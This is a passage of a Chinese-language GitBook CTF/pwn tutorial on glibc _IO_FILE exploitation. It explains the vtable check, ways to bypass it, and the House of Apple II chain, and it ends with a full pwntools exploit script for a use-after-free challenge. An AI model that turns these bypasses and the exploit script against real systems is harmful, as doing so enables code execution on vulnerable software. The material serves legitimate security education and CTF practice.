      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
       || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span>
           &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr
                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))
#endif
       )
      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)   <span class="hljs-comment">// &#x5982;&#x679C;&#x8F93;&#x51FA;&#x7F13;&#x51B2;&#x533A;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x5237;&#x65B0;&#x8F93;&#x51FA;&#x7F13;&#x51B2;&#x533A;</span>
    result = EOF;


    fp = fp-&gt;_chain; <span class="hljs-comment">//&#x904D;&#x5386;&#x94FE;&#x8868;</span>
    }
...
}
</code></pre>
<h3 id="&#x865A;&#x8868;&#x68C0;&#x67E5;">&#x865A;&#x8868;&#x68C0;&#x67E5;</h3>
<p>&#x7248;&#x672C;&#x5DEE;&#x5F02;</p>
<blockquote>
<ol>
<li>2.23 &#x7684;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x9650;&#x5236;&#xFF0C;&#x53EF;&#x4EE5;&#x5C06;<code>vtable</code> &#x52AB;&#x6301;&#x5728;&#x5806;&#x4E0A;&#x5E76;&#x4FEE;&#x6539;&#x5176;&#x5185;&#x5BB9;&#xFF0C;&#x7136;&#x540E;&#x89E6;&#x53D1;FSOP</li>
<li>2.24 &#x5F15;&#x5165;&#x4E86;<code>vtable check</code>&#xFF0C;&#x4F7F;&#x5F97;&#x5C06; <code>vtable</code> &#x6574;&#x4F53;&#x52AB;&#x6301;&#x5230;&#x5806;&#x4E0A;&#x5DF2;&#x4E0D;&#x53EF;&#x80FD;&#xFF0C;&#x4F46;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5185;&#x90E8; <code>vtable</code> &#x4E2D;<code>_IO_str_jumps</code> &#x6216; <code>_IO_wstr_jumps</code> &#x6765;&#x5229;&#x7528;</li>
<li>2.31 &#x4E2D;&#x5C06; <code>_IO_str_finish</code> &#x51FD;&#x6570;&#x4E2D;&#x5F3A;&#x5236;&#x6267;&#x884C; <code>free</code> &#x51FD;&#x6570;&#xFF0C;&#x5BFC;&#x81F4;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;&#x4E4B;&#x524D;&#x7684;&#x5229;&#x7528;&#x94FE;</li>
<li>2.37 &#x91CD;&#x6784;...</li>
</ol>
</blockquote>
<p>&#x865A;&#x8868;&#x4F4D;&#x7F6E;&#x5224;&#x65AD;&#x4E3B;&#x8981;&#x5728; <code>IO_validate_vtable</code> &#x51FD;&#x6570;, 2.37&#x4E4B;&#x524D;&#x7684;&#x5224;&#x65AD;&#x533A;&#x95F4;&#x4E3A; <code>_IO_helper_jumps - _IO_str_jumps</code> &#x4E4B;&#x95F4;&#x7684; 0xd60 &#x533A;&#x57DF; </p>
<pre><code class="lang-c">_IO_helper_jumps
_IO_helper_jumps
_IO_cookie_jumps
_IO_proc_jumps
_IO_str_chk_jumps
_IO_wstrn_jumps
_IO_wstr_jumps
_IO_wfile_jumps_maybe_mmap
_IO_wfile_jumps_mmap
__GI__IO_wfile_jumps
_IO_wmem_jumps
_IO_mem_jumps
_IO_strn_jumps
_IO_obstack_jumps
_IO_file_jumps_maybe_mmap
_IO_file_jumps_mmap
__GI__IO_file_jumps
_IO_str_jumps
</code></pre>
<p>&#x865A;&#x8868;&#x68C0;&#x67E5;&#x51FD;&#x6570; <code>_IO_vtable_check</code>, &#x540C;&#x610F;&#x5F00;&#x53D1;&#x8005;&#x5728;&#x5916;&#x90E8;&#x91CD;&#x6784; <code>vtable</code>&#xFF0C;&#x53EA;&#x662F;&#x8981;&#x6EE1;&#x8DB3;&#x4E00;&#x5B9A;&#x6761;&#x4EF6;</p>
<pre><code class="lang-c"><span class="hljs-keyword">void</span> attribute_hidden _IO_vtable_check (<span class="hljs-keyword">void</span>)
{
<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> SHARED</span>
  <span class="hljs-comment">/* Honor the compatibility flag.  */</span>
  <span class="hljs-keyword">void</span> (*flag) (<span class="hljs-keyword">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);
<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> PTR_DEMANGLE</span>
  PTR_DEMANGLE (flag);
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
  <span class="hljs-keyword">if</span> (flag == &amp;_IO_vtable_check) <span class="hljs-comment">// &#x68C0;&#x67E5;&#x662F;&#x5426;&#x662F;&#x5916;&#x90E8;&#x91CD;&#x6784;&#x7684; vtable</span>
    <span class="hljs-keyword">return</span>;
</code></pre>
<p>&#x7ED5;&#x8FC7;&#x865A;&#x8868;&#x68C0;&#x67E5;&#x7684;&#x4E09;&#x79CD;&#x65B9;&#x5F0F;, &#x9700;&#x8981;&#x6709; ld &#x6587;&#x4EF6;</p>
<blockquote>
<ol>
<li>&#x6CC4;&#x9732; <code>ptr_guard</code>&#xFF0C;&#x53CD;&#x7B97; <code>IO_accept_foreign_vtables</code> &#x7136;&#x540E;&#x4FEE;&#x6539;</li>
<li>&#x6216;&#x8005;, &#x56E0;&#x4E3A; <code>IO_accept_foreign_vtables</code> &#x4E2D;&#x57FA;&#x672C;&#x90FD;&#x662F;0&#xFF0C;&#x76F4;&#x63A5;&#x5C06; <code>ptr_guard</code> &#x4FEE;&#x6539;&#x4E3A; <code>&amp;_IO_vtable_check</code> </li>
<li><code>check_stdfiles_vtables</code> &#x51FD;&#x6570;&#x662F;&#x8BBE;&#x7F6E;&#x5916;&#x7F6E;&#x865A;&#x8868;&#x7684;&#x51FD;&#x6570;, &#x8C03;&#x7528;&#x8BE5;&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x865A;&#x8868;&#x68C0;&#x67E5;</li>
<li>2.37 &#x6CA1;&#x6709;&#x52A0;&#x4FDD;&#x62A4;&#x7684; &#x5BBD;&#x5B57;&#x7B26;&#x8DF3;&#x8868;</li>
</ol>
</blockquote>
<h3 id="&#x5BBD;&#x5B57;&#x7B26;&#x8DF3;&#x8868;">&#x5BBD;&#x5B57;&#x7B26;&#x8DF3;&#x8868;</h3>
<p><code>house of apple</code> &#x548C; <code>house of cat</code> &#x7684;&#x5229;&#x7528;&#x94FE;&#x90FD;&#x6709;&#x6D89;&#x53CA;&#x672A;&#x52A0;&#x4FDD;&#x62A4;&#x7684;&#x5BBD;&#x5B57;&#x7B26;&#x8DF3;&#x8868;, &#x5176;&#x4E2D;&#x53EA;&#x6709;4&#x4E2A;&#x4F1A;&#x5B9E;&#x9645;&#x5F15;&#x7528; (&#x6807;&#x6CE8;&#x5728;&#x6CE8;&#x91CA;&#x90E8;&#x5206;)</p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WFINISH(FP) WJUMP1 (__finish, FP, 0)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH) <span class="hljs-comment">// 1</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WUNDERFLOW(FP) WJUMP0 (__underflow, FP)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WUFLOW(FP) WJUMP0 (__uflow, FP) <span class="hljs-comment">// 2</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WPBACKFAIL(FP, CH) WJUMP1 (__pbackfail, FP, CH)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WXSPUTN(FP, DATA, N) WJUMP2 (__xsputn, FP, DATA, N)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WXSGETN(FP, DATA, N) WJUMP2 (__xsgetn, FP, DATA, N)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WSEEKOFF(FP, OFF, DIR, MODE) WJUMP3 (__seekoff, FP, OFF, DIR, MODE)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WSEEKPOS(FP, POS, FLAGS) WJUMP2 (__seekpos, FP, POS, FLAGS)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WSETBUF(FP, BUFFER, LENGTH) WJUMP2 (__setbuf, FP, BUFFER, LENGTH) <span class="hljs-comment">// 3</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WSYNC(FP) WJUMP0 (__sync, FP)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP) <span class="hljs-comment">// 4</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WSYSREAD(FP, DATA, LEN) WJUMP2 (__read, FP, DATA, LEN)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WSYSWRITE(FP, DATA, LEN) WJUMP2 (__write, FP, DATA, LEN)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WSYSSEEK(FP, OFFSET, MODE) WJUMP2 (__seek, FP, OFFSET, MODE)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WSYSCLOSE(FP) WJUMP0 (__close, FP)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WSYSSTAT(FP, BUF) WJUMP1 (__stat, FP, BUF)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WSHOWMANYC(FP) WJUMP0 (__showmanyc, FP)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WIMBUE(FP, LOCALE) WJUMP1 (__imbue, FP, LOCALE)</span>
</code></pre>
<h2 id="house-of-apple-ii">House of Apple II</h2>
<p>&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x9002;&#x7528;&#x6027;&#x6700;&#x5E7F;&#x6CDB;&#x7684; house <sup>[4]</sup> &#x5229;&#x7528;&#x94FE;&#x6765;&#x4F5C;&#x4E3A; _IO_FILE &#x5229;&#x7528;&#x7684;&#x793A;&#x4F8B;.</p>
<p>House of Apple II &#x7684;&#x5229;&#x7528;&#x6761;&#x4EF6;&#x6709;&#x4E09;&#x4E2A;</p>
<ul>
<li>&#x6CC4;&#x9732; <code>heap</code> &#x5730;&#x5740;&#x548C; <code>glibc</code> &#x5730;&#x5740;</li>
<li>&#x80FD;&#x63A7;&#x5236;&#x7A0B;&#x5E8F;&#x6267;&#x884C; <code>IO</code> &#x64CD;&#x4F5C;&#xFF0C;&#x5305;&#x62EC;&#x4F46;&#x4E0D;&#x9650;&#x4E8E;&#xFF1A;&#x4ECE; <code>main</code> &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x3001;&#x8C03;&#x7528; <code>exit</code> &#x51FD;&#x6570;&#x3001;&#x901A;&#x8FC7; <code>__malloc_assert</code> &#x89E6;&#x53D1;</li>
<li>&#x80FD;&#x63A7;&#x5236; <code>_IO_FILE</code> &#x7684; <code>vtable</code> &#x548C; <code>_wide_data</code> ( <code>largebin attack</code> )</li>
</ul>
<p>&#x6BCF;&#x4E2A;&#x5C5E;&#x6027;&#x7684;&#x5730;&#x5740;&#x504F;&#x79FB;&#x5982;&#x4E0B;</p>
<pre><code class="lang-c">0x0:&apos;_flags&apos;,
0x8:&apos;_IO_read_ptr&apos;,
0x10:&apos;_IO_read_end&apos;,
0x18:&apos;_IO_read_base&apos;,
0x20:&apos;_IO_write_base&apos;,
0x28:&apos;_IO_write_ptr&apos;,
0x30:&apos;_IO_write_end&apos;,
0x38:&apos;_IO_buf_base&apos;,
0x40:&apos;_IO_buf_end&apos;,
0x48:&apos;_IO_save_base&apos;,
0x50:&apos;_IO_backup_base&apos;,
0x58:&apos;_IO_save_end&apos;,
0x60:&apos;_markers&apos;,
0x68:&apos;_chain&apos;,
0x70:&apos;_fileno&apos;,
0x74:&apos;_flags2&apos;,
0x78:&apos;_old_offset&apos;,
0x80:&apos;_cur_column&apos;,
0x82:&apos;_vtable_offset&apos;,
0x83:&apos;_shortbuf&apos;,
0x88:&apos;_lock&apos;,
// &#x4EE5;&#x4E0A; _IO_FILE &#x7ED3;&#x6784;&#x4F53;
0x90:&apos;_offset&apos;,
0x98:&apos;_codecvt&apos;,
0xa0:&apos;_wide_data&apos;,
0xa8:&apos;_freeres_list&apos;,
0xb0:&apos;_freeres_buf&apos;,
0xb8:&apos;__pad5&apos;,
0xc0:&apos;_mode&apos;,
0xc4:&apos;_unused2&apos;,
// &#x4EE5;&#x4E0A; _IO_FILE_complete &#x7ED3;&#x6784;&#x4F53;
0xd8:&apos;vtable&apos;,
// &#x4EE5;&#x4E0A; _IO_FILE_plus &#x7ED3;&#x6784;&#x4F53;
0xe0:&apos;_wide_vtable&apos;
// _wide_vtable &#x662F; _IO_wide_data &#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x5C5E;&#x6027;
</code></pre>
<p>&#x6D89;&#x53CA; <code>_wide_data</code> &#x7ED3;&#x6784;, &#x7ED9;&#x51FA;&#x5BF9;&#x5E94;&#x6E90;&#x4EE3;&#x7801;. </p>
<pre><code class="lang-c"><span class="hljs-keyword">struct</span> _IO_wide_data
{
  <span class="hljs-keyword">wchar_t</span> *_IO_read_ptr;    <span class="hljs-comment">/* Current read pointer */</span>
  <span class="hljs-keyword">wchar_t</span> *_IO_read_end;    <span class="hljs-comment">/* End of get area. */</span>
  <span class="hljs-keyword">wchar_t</span> *_IO_read_base;    <span class="hljs-comment">/* Start of putback+get area. */</span>
  <span class="hljs-keyword">wchar_t</span> *_IO_write_base;    <span class="hljs-comment">/* Start of put area. */</span>
  <span class="hljs-keyword">wchar_t</span> *_IO_write_ptr;    <span class="hljs-comment">/* Current put pointer. */</span>
  <span class="hljs-keyword">wchar_t</span> *_IO_write_end;    <span class="hljs-comment">/* End of put area. */</span>
  <span class="hljs-keyword">wchar_t</span> *_IO_buf_base;    <span class="hljs-comment">/* Start of reserve area. */</span>
  <span class="hljs-keyword">wchar_t</span> *_IO_buf_end;        <span class="hljs-comment">/* End of reserve area. */</span>
  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span>
  <span class="hljs-keyword">wchar_t</span> *_IO_save_base;    <span class="hljs-comment">/* Pointer to start of non-current get area. */</span>
  <span class="hljs-keyword">wchar_t</span> *_IO_backup_base;    <span class="hljs-comment">/* Pointer to first valid character of
                   backup area */</span>
  <span class="hljs-keyword">wchar_t</span> *_IO_save_end;    <span class="hljs-comment">/* Pointer to end of non-current get area. */</span>

  <span class="hljs-keyword">__mbstate_t</span> _IO_state;
  <span class="hljs-keyword">__mbstate_t</span> _IO_last_state;
  <span class="hljs-keyword">struct</span> _IO_codecvt _codecvt;
  <span class="hljs-keyword">wchar_t</span> _shortbuf[<span class="hljs-number">1</span>];
  <span class="hljs-keyword">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *_wide_vtable;
};
</code></pre>
<p>&#x4EE5; <code>vtable-&gt;_overflow</code> &#x8C03;&#x7528;&#x4E3A;&#x4F8B;&#xFF0C;&#x6240;&#x7528;&#x5230;&#x7684;&#x5B8F;&#x4F9D;&#x6B21;&#x4E3A;</p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WIDE_JUMPS(THIS) _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span>
</code></pre>
<p>&#x5229;&#x7528;&#x94FE;: &#x52AB;&#x6301; <code>IO_FILE</code> &#x7684; <code>vtable</code> &#x4E3A; <code>_IO_wfile_jumps</code> --&gt; &#x63A7;&#x5236; <code>_wide_data</code> &#x4E3A;&#x53EF;&#x63A7;&#x7684;&#x5806;&#x5730;&#x5740;&#x7A7A;&#x95F4; --&gt; &#x63A7;&#x5236; <code>_wide_data-&gt;_wide_vtable</code> &#x4E3A;&#x53EF;&#x63A7;&#x7684;&#x5806;&#x5730;&#x5740;&#x7A7A;&#x95F4; --&gt; &#x63A7;&#x5236;&#x7A0B;&#x5E8F;&#x6267;&#x884C; <code>IO</code> &#x6D41;&#x51FD;&#x6570;&#x8C03;&#x7528; --&gt; &#x8C03;&#x7528;&#x5230; <code>_IO_W*</code> &#x51FD;&#x6570;&#x5373;&#x53EF;&#x63A7;&#x5236;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#x6D41;&#x3002;</p>
<p>&#x7A0B;&#x5E8F;&#x4ECE; <code>main</code> &#x8FD4;&#x56DE;&#x6216;&#x8005;&#x6267;&#x884C; <code>exit</code> &#x540E;&#x4F1A;&#x904D;&#x5386; <code>_IO_list_all</code> &#x5B58;&#x653E;&#x7684;&#x6BCF;&#x4E00;&#x4E2A; <code>IO_FILE</code> &#x7ED3;&#x6784;&#x4F53;&#xFF0C;&#x5982;&#x679C;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;&#x7684;&#x8BDD;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;&#x6BCF;&#x4E2A;&#x7ED3;&#x6784;&#x4F53;&#x4E2D; <code>vtable-&gt;_overflow</code> &#x51FD;&#x6570;&#x6307;&#x9488;&#x6307;&#x5411;&#x7684;&#x51FD;&#x6570;&#x3002;</p>
<h3 id="&#x4F8B;&#x9898;">&#x4F8B;&#x9898;</h3>
<p><a href="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/data/pwn_oneday.zip" target="_blank">pwn_oneday</a> (&#x4E0B;&#x8F7D;&#x94FE;&#x63A5;&#x53EF;&#x80FD;&#x968F;&#x65F6;&#x95F4;&#x5931;&#x6548;)</p>
<p>exp:</p>
<ol>
<li>&#x52AB;&#x6301; <code>IO_FILE</code> &#x7684; <code>vtable</code> &#x4E3A; <code>_IO_wfile_jumps</code> </li>
<li>&#x63A7;&#x5236; <code>_wide_data</code> &#x4E3A;&#x53EF;&#x63A7;&#x7684;&#x5806;&#x5730;&#x5740;&#x7A7A;&#x95F4;</li>
<li>&#x63A7;&#x5236; <code>_wide_data-&gt;_wide_vtable</code> &#x4E3A;&#x53EF;&#x63A7;&#x7684;&#x5806;&#x5730;&#x5740;&#x7A7A;&#x95F4;</li>
<li>&#x63A7;&#x5236;&#x7A0B;&#x5E8F;&#x6267;&#x884C;<code>IO</code>&#x6D41;&#x51FD;&#x6570;&#x8C03;&#x7528;&#xFF0C;&#x6700;&#x7EC8;&#x8C03;&#x7528;&#x5230; <code>_IO_Wxxxxx</code> &#x51FD;&#x6570;&#x63A7;&#x5236;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#x6D41;</li>
</ol>
<p>&#x7ED9;&#x51FA;&#x4E00;&#x4E2A;&#x672C;&#x5730;2.34&#x7248;&#x672C; Glibc &#x52AB;&#x6301; vtable &#x7684; exp</p>
<pre><code class="lang-python"><span class="hljs-comment"># template-v2.0 for exploit scripts by fa1c4</span>
<span class="hljs-comment"># usage: python exp.py [REMOTE|GDB|NULL]</span>
<span class="hljs-string">&apos;&apos;&apos;
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    vuln: UAF in Del function
&apos;&apos;&apos;</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

<span class="hljs-comment"># define the context</span>
binary_name = <span class="hljs-string">&apos;./oneday&apos;</span>
libc_name = <span class="hljs-string">&apos;./libc.so.6&apos;</span> <span class="hljs-keyword">if</span> args.REMOTE \
    <span class="hljs-keyword">else</span> <span class="hljs-string">&apos;./libc.so.6&apos;</span>
elf = ELF(binary_name, checksec=<span class="hljs-keyword">True</span>) <span class="hljs-keyword">if</span> binary_name <span class="hljs-keyword">else</span> <span class="hljs-keyword">None</span>
libc = ELF(libc_name, checksec=<span class="hljs-keyword">False</span>) <span class="hljs-keyword">if</span> libc_name <span class="hljs-keyword">else</span> <span class="hljs-keyword">None</span>
context.binary = elf
context(arch=elf.arch, os=elf.os)
context.terminal = [<span class="hljs-string">&apos;tmux&apos;</span>, <span class="hljs-string">&apos;splitw&apos;</span>, <span class="hljs-string">&apos;-h&apos;</span>]
context.log_level = <span class="hljs-string">&apos;DEBUG&apos;</span>

<span class="hljs-comment"># define the io functions</span>
rc  = <span class="hljs-keyword">lambda</span> *x, **y: io.recv(*x, **y)
rl  = <span class="hljs-keyword">lambda</span> *x, **y: io.recvline(*x, **y)
ru  = <span class="hljs-keyword">lambda</span> *x, **y: io.recvuntil(*x, **y)
sn  = <span class="hljs-keyword">lambda</span> *x, **y: io.send(*x, **y)
sl  = <span class="hljs-keyword">lambda</span> *x, **y: io.sendline(*x, **y)
sa  = <span class="hljs-keyword">lambda</span> *x, **y: io.sendafter(*x, **y)
sla = <span class="hljs-keyword">lambda</span> *x, **y: io.sendlineafter(*x, **y)

<span class="hljs-comment"># define the io object</span>
<span class="hljs-keyword">if</span> args.REMOTE:
    io = remote(<span class="hljs-string">&apos;challenge.ctf.games&apos;</span>, <span class="hljs-number">30269</span>)
<span class="hljs-keyword">elif</span> args.GDB:
    io = gdb.debug(binary_name, gdbscript=<span class="hljs-string">&quot;&quot;&quot;
        # brva 0x2333
        b free
        c
    &quot;&quot;&quot;</span>, aslr=<span class="hljs-keyword">False</span>)
<span class="hljs-keyword">else</span>:
    io = process(binary_name)

<span class="hljs-comment"># exploiting code</span>
key, small, medium, large = <span class="hljs-number">10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Add</span><span class="hljs-params">(c)</span>:</span>
    sla(<span class="hljs-string">b&quot;enter your command: \n&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)
    sla(<span class="hljs-string">b&quot;choise: &quot;</span>, str(c).encode())

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Del</span><span class="hljs-params">(i)</span>:</span>
    sla(<span class="hljs-string">b&quot;enter your command: \n&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)
    sla(<span class="hljs-string">b&quot;Index: \n&quot;</span>, str(i).encode())

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Read</span><span class="hljs-params">(i, data)</span>:</span>
    sla(<span class="hljs-string">b&quot;enter your command: \n&quot;</span>, <span class="hljs-string">b&quot;3&quot;</span>)
    sla(<span class="hljs-string">b&quot;Index: &quot;</span>, str(i).encode())
    sa(<span class="hljs-string">b&quot;Message: \n&quot;</span>, flat(data, length = <span class="hljs-number">0x110</span> * key))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Write</span><span class="hljs-params">(i)</span>:</span>
    sla(<span class="hljs-string">b&quot;enter your command: \n&quot;</span>, <span class="hljs-string">b&quot;4&quot;</span>)
    sla(<span class="hljs-string">b&quot;Index: &quot;</span>, str(i).encode())
    ru(<span class="hljs-string">b&quot;Message: \n&quot;</span>)
    m = rc(<span class="hljs-number">0x10</span>)
    d1 = u64(m[:<span class="hljs-number">8</span>])
    d2 = u64(m[<span class="hljs-number">8</span>:])
    log.info(f<span class="hljs-string">&quot;d1: {d1:#x}&quot;</span>)
    log.info(f<span class="hljs-string">&quot;d2: {d2:#x}&quot;</span>)
    <span class="hljs-keyword">return</span> d1, d2

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Bye</span><span class="hljs-params">()</span>:</span>
    sla(<span class="hljs-string">b&apos;enter your command: \n&apos;</span>, <span class="hljs-string">b&apos;9&apos;</span>)

sla(<span class="hljs-string">b&apos;enter your key &gt;&gt;\n&apos;</span>, str(key).encode())

Add(medium)
Add(medium)
Add(small)

Del(<span class="hljs-number">2</span>)
Del(<span class="hljs-number">1</span>)
Del(<span class="hljs-number">0</span>)

Add(small)
Add(small)
Add(small)
Add(small)

Del(<span class="hljs-number">3</span>)
Del(<span class="hljs-number">5</span>)
m1, m2 = Write(<span class="hljs-number">3</span>)
libc.address = m1 - <span class="hljs-number">0x1f2cc0</span>
heap_base = m2 - <span class="hljs-number">0x17f0</span>

Del(<span class="hljs-number">4</span>)
Del(<span class="hljs-number">6</span>)

Add(large)
Add(small)
Add(small)

Del(<span class="hljs-number">8</span>)
Add(large)

target_addr = libc.sym._IO_list_all
_IO_wfile_jumps = libc.sym._IO_wfile_jumps

_lock = libc.address + <span class="hljs-number">0x1f5720</span>
fake_IO_FILE = heap_base + <span class="hljs-number">0x1810</span>

f1 = FileStructure()
f1.flags = u64(<span class="hljs-string">b&quot;  fa1c4&quot;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))
f1._IO_read_ptr = <span class="hljs-number">0xa81</span>
f1._lock = _lock
f1._wide_data = fake_IO_FILE + <span class="hljs-number">0xe0</span>
f1.vtable = _IO_wfile_jumps

payload = flat({
    <span class="hljs-number">0x8</span>: target_addr - <span class="hljs-number">0x20</span>,
    <span class="hljs-number">0x10</span>: {
        <span class="hljs-number">0</span>: {
            <span class="hljs-number">0</span>: bytes(f1),
            <span class="hljs-number">0xe0</span>: { <span class="hljs-comment"># _wide_data-&gt;_wide_vtable</span>
                <span class="hljs-number">0x18</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># f-&gt;_wide_data-&gt;_IO_write_base</span>
                <span class="hljs-number">0x30</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># f-&gt;_wide_data-&gt;_IO_buf_base</span>
                <span class="hljs-number">0xe0</span>: fake_IO_FILE + <span class="hljs-number">0x200</span>
            },
            <span class="hljs-number">0x200</span>: {
                <span class="hljs-number">0x68</span>: libc.sym.puts
            }
        },
        <span class="hljs-number">0xa80</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0xab1</span>]
    }
})

Read(<span class="hljs-number">5</span>, payload)
Del(<span class="hljs-number">2</span>)
Add(large)

Bye()

<span class="hljs-comment"># interact with the shell</span>
io.interactive()
</code></pre>
<p>tbc: &#x8865;&#x5145;&#x8C03;&#x8BD5;&#x548C;ORW&#x7248;&#x672C;exp...</p>
<h2 id="references">References</h2>
<p>[1] <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source" target="_blank">https://elixir.bootlin.com/glibc/glibc-2.35/source</a></p>
<p>[2] <a href="https://bbs.kanxue.com/thread-275968.htm" target="_blank">https://bbs.kanxue.com/thread-275968.htm</a></p>
<p>[3] <a href="https://ctf-wiki.org/pwn/linux/user-mode/io-file/fsop/" target="_blank">https://ctf-wiki.org/pwn/linux/user-mode/io-file/fsop/</a></p>
<p>[4] <a href="https://bbs.kanxue.com/thread-273832.htm" target="_blank">https://bbs.kanxue.com/thread-273832.htm</a></p>
<p>[5] <a href="https://yuan0x1elegy.love/posts/pwn/io_file/house_of_apple2.html" target="_blank">https://yuan0x1elegy.love/posts/pwn/io_file/house_of_apple2.html</a></p>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="./" class="navigation navigation-prev " aria-label="Previous page: Pwn">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="../reverse/" class="navigation navigation-next " aria-label="Next page: Reverse">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Glibc _IO_FILE Exploitation Introduction","date":"2024-12-03T00:00:00.000Z","permalink":"/gitbook/pwn/glibc_IO_FILE_exploitation/","tags":["pwn","_IO_FILE"],"level":"4.1.1","depth":2,"next":{"title":"Reverse","level":"5.1","depth":1,"path":"reverse/index.md","ref":"reverse/index.md","articles":[{"title":"IDAPro Cheat Sheet 7.7","level":"5.1.1","depth":2,"path":"reverse/IDAPro_cheatsheet_7x.md","ref":"reverse/IDAPro_cheatsheet_7x.md","articles":[]}]},"previous":{"title":"Pwn","level":"4.1","depth":1,"path":"pwn/index.md","ref":"pwn/index.md","articles":[{"title":"Glibc _IO_FILE Exploitation Introduction","level":"4.1.1","depth":2,"path":"pwn/glibc_IO_FILE_exploitation.md","ref":"pwn/glibc_IO_FILE_exploitation.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["theme-default","toggle-chapters","katex","sharing","lunr","search","livereload","fontsettings","highlight","theme-comscore"],"styles":{"website":"styles/website.css"},"pluginsConfig":{"livereload":{},"search":{},"lunr":{"ignoreSpecialCharacters":false,"maxIndexSize":1000000},"katex":{},"fontsettings":{"family":"sans","size":2,"theme":"white","fontFamily":"Arial Unicode 